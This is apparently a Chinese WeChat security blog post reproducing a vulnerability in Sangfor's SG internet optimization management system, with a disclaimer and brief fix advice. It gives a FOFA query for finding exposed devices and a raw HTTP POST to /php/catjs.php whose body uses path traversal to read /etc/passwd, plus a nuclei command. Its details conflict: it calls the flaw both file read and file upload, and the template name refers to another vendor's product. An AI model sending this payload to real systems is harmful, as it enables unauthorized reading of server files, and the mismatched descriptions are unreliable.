#  漏洞复现|深信服SG上网优化管理系统存在文件读取漏洞   
原创 禾小盾  数字人才创研院   2023-10-12 15:51  
  
点击上方  
蓝字关注我们  
  
BEGINNING OF SPRING  
  
![](https://mmbiz.qpic.cn/mmbiz_gif/z7icWibwNQicf1QCEcTzvGFkdLPgp832KCow54U64xGcfU3BoUqphwjsUoJic0EyTBMFAxEykWLnfeILAcZRtzLrdQ/640?wx_fmt=gif "")  
  
  
0x01  
  
      阅读须知         
  
Reading Instructions  
  
![](https://mmbiz.qpic.cn/mmbiz_png/X8pI8icoh79vrwCxdib7QSBb6QLSO3psbEiaXHfy8RZh13ic6m57LBtGhC60SdVIVRk7GmvkqiaibIriaHvgkORAia55lQ/640?wx_fmt=png "")  
  
    数字人才创研院秉承探究学习与交流的理念，一切从降低已有潜在威胁出发，所有发布的技术文章仅供参考，未经授权请勿利用文章中的技术内容对任何计算机系统进行入侵操作，否则对他人或单位而造成的直接或间接后果和损失，均由使用者本人负责。  
  
    郑重声明：本文所提供的工具与思路仅用于学习与研究，禁止用于非法目的！  
  
团队已致电说明并告知详细解决方案！  
  
![](https://mmbiz.qpic.cn/mmbiz_png/XQsIhMDyz0unrjh9QZibtE16IibicwafvgPDLKqCMhDFfddJIWIHR8FWuIjyib2OpS1LNz9VWTt0EBTwTHMpSibibvng/640?wx_fmt=png "")  
  
  
0x02  
  
       漏洞概述        
  
Vulnerability Overview  
  
  深信服科技股份有限公司是一家专注于企业级网络安全、云计算、IT基础设施与物联网的产品和服务供应商，拥有深信服智安全、信服云两大业务品牌，与子公司信锐技术，致力于承载各行业用户数字化转型过程中的基石性工作，从而让每个用户的数字化更简单、更安全。  
  
  深信服SG上网优化管理系统 catjs.php  
**存在任意文件上传漏洞**，  
未经授权的攻击者通过漏洞可以上传任意文件，获取服务器权  
限。  
  
  
  
![](https://mmbiz.qpic.cn/mmbiz_jpg/MPrt2xIEpHQrRiazwwibvw1eEevqHCYicDRhVvPC4nRIWeHZiar4wQWCcrXPEZOCYH5EVSHtMgvPP4rmVNdibhTG4GQ/640?wx_fmt=jpeg "")  
  
**(文章仅限技术交流，禁止非授权操作！)**  
  
0x03  
  
       漏洞复现        
  
Vulnerability Recurrence  
  
![](https://mmbiz.qpic.cn/mmbiz_png/bDYS2PAYoqic9mQ5FnGia01eSuHGU1UPycSXqxrvp6ibBX9pQPGfK2AWibOef8ET2TJ8OCoaian4s8C6zgqyavG6ibPQ/640?wx_fmt=png "")  
  
fofa：title="SANGFOR上网优化管理"  
  
  
1.执行如下语句上传txt文档，并访问该txt文件。  
```

POST /php/catjs.php HTTP/1.1
Host: {Hostname}
User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0
Content-Length: 35
Accept-Encoding: gzip, deflate
Connection: close
Content-Type: application/x-www-form-urlencoded
["../../../../../../../etc/passwd"]

其中Hostname为目标漏洞平台的实际地址或域名
```  
  
  
  
  
2.访问  
目标漏洞资产  
，得到内容“敏感信息”  
  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/MPrt2xIEpHQrRiazwwibvw1eEevqHCYicDRND4FjPqjZTjEsXTOhHTicibnQb6C7DlFuGCKv3FNH0jMiaCJTPG4vbeWw/640?wx_fmt=png "")  
  
**(文章仅限技术交流，禁止非授权操作！)**  
  
0x04  
  
     漏洞脚本       
  
Vulnerability script  
  
1.Nuclei验证脚本命令使用如下：  
```
nuclei.exe -t wangshen-secgate-objappupfile-fileupload.yaml -l wangshen-secgate-objappupfile-fileupload_Subs.txt
--------------------------------------------
wangshen-secgate-objappupfile-fileupload_Subs.txt可以结合实际情况自定义
--------------------------------------------
```  
  
  
  
  
2.空间指纹截图如下：  
  
![](https://mmbiz.qpic.cn/mmbiz_jpg/MPrt2xIEpHQrRiazwwibvw1eEevqHCYicDRQhh0GdibsPSJ0WV1U3jYIiatDSaWjz16eCs6KWUT1DQEiab0dCQwlznzA/640?wx_fmt=jpeg "")  
  
  
  
  
3.关注公众号并回复：  
**深信服SG**  
，即可**获取脚本**  
。  
  
  
  
  
**(文章仅限技术交流，禁止非授权操作！)**  
  
0x05  
  
     修复建议       
  
Repair Suggestions  
  
1.实施产品的权限访问控制，降低互联网搜索引擎的查询。  
  
  
  
2.加强后台认证要求（如AAAA策略等），提高口令的安全性。  
  
  
  
3.增强关键页面的安全性，提升WEB后台的安全访问控制权限能力。  
  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/ib745vqibLBGIeAicnHiag9GCzTYjeicic5IWPqfyjLajDuwtJdNCAnCgcolqY8ROaE5CsEXR5zbjCU9aVl3WfkZpnDw/640?wx_fmt=png "")  
  
往期推荐 · 值得阅看  
  
  
[点亮「星标」，让我们不再错过~2023-10-11 ](https://mp.weixin.qq.com/s?__biz=MzkwODMzOTA2NA==&mid=2247492095&idx=1&sn=9420eaa5c76b190b343b41ab1bc65e89&chksm=c0c9d3e8f7be5afe30b91b8b3c54ca3eab08d2ff629f41b00b6b2dae44994606990c9c4b7690&scene=21#wechat_redirect)  
  
  
[漏洞复现|网神SecGate3600防火墙存在任意文件上传漏洞2023-09-28 ](https://mp.weixin.qq.com/s?__biz=MzkwODMzOTA2NA==&mid=2247491725&idx=1&sn=46a57080be18fe06606ade8e06818ad3&chksm=c0c9d29af7be5b8c55ae5f4a2e1ada52dd6166bf976f22ec3cb35808abbaee40536e94523269&scene=21#wechat_redirect)  
  
  
[漏洞复现|某友集团报表系统存在未授权访问+任意文件上传利用漏洞2023-09-20 ](https://mp.weixin.qq.com/s?__biz=MzkwODMzOTA2NA==&mid=2247491223&idx=1&sn=b94be504d8ee400999daf770758f3dbe&chksm=c0ca2c80f7bda59632c9dafb1d3c33e1f344e27822fb5860e768b9fc5140c045d0826a9cf64f&scene=21#wechat_redirect)  
  
  
[漏洞复现|某VPN存在未授权管理用户遍历+任意账号密码修改漏洞2023-08-15 ](https://mp.weixin.qq.com/s?__biz=MzkwODMzOTA2NA==&mid=2247491171&idx=1&sn=ec1fd325fcbbd7aae3b7d1d1e80c4e66&chksm=c0ca2c74f7bda56270c74ec0c99da89261d0a3a3b4708c23bf52be8e867e387935beacbdc496&scene=21#wechat_redirect)  
  
  
[PHPMyadmin的Getshell方法汇总2023-07-01 ](https://mp.weixin.qq.com/s?__biz=MzkwODMzOTA2NA==&mid=2247489772&idx=1&sn=bb2dff403c65967b451f73d0716b3ff7&chksm=c0ca2afbf7bda3eda3dbbe4a70bb3e6e76a3a08affbfa79fc28664bcf54e5ab1e8d8bfaf9c88&scene=21#wechat_redirect)  
  
  
[漏洞复现|北京网康 NS-ASG安全网关存在远程命令执行漏洞2023-06-19 ](https://mp.weixin.qq.com/s?__biz=MzkwODMzOTA2NA==&mid=2247489074&idx=1&sn=e73cda6e82c3ecd9e744b47b8c724476&chksm=c0ca2425f7bdad3358bb6befad958262a271c3e80dc907d29255ce6321294c7c8d9be19ce5a4&scene=21#wechat_redirect)  
  
  
[漏洞复现|联软科技安全准入门户平台存在远程代码执行漏洞](https://mp.weixin.qq.com/s?__biz=MzkwODMzOTA2NA==&mid=2247488202&idx=1&sn=4c78b80022a12ed637d312647a2f7ee2&chksm=c0ca20ddf7bda9cb738eaea8983768026a1184189b0417577f716750a4f34041f8fcf7a05bd8&scene=21#wechat_redirect)  
  
  
[2023-06-02](https://mp.weixin.qq.com/s?__biz=MzkwODMzOTA2NA==&mid=2247488202&idx=1&sn=4c78b80022a12ed637d312647a2f7ee2&chksm=c0ca20ddf7bda9cb738eaea8983768026a1184189b0417577f716750a4f34041f8fcf7a05bd8&scene=21#wechat_redirect)  
  
[](https://mp.weixin.qq.com/s?__biz=MzkwODMzOTA2NA==&mid=2247488202&idx=1&sn=4c78b80022a12ed637d312647a2f7ee2&chksm=c0ca20ddf7bda9cb738eaea8983768026a1184189b0417577f716750a4f34041f8fcf7a05bd8&scene=21#wechat_redirect)  
  
  
  
![](https://mmbiz.qpic.cn/mmbiz_gif/MPrt2xIEpHS7vY5SI8cwvJ72nffia4HaVDAoUJxZNlEwC6VPkWv3HaU87FESAArqcqj4Lh9t3Yd7YP2ZDrOto0Q/640?wx_fmt=gif "")  
  
END  
  
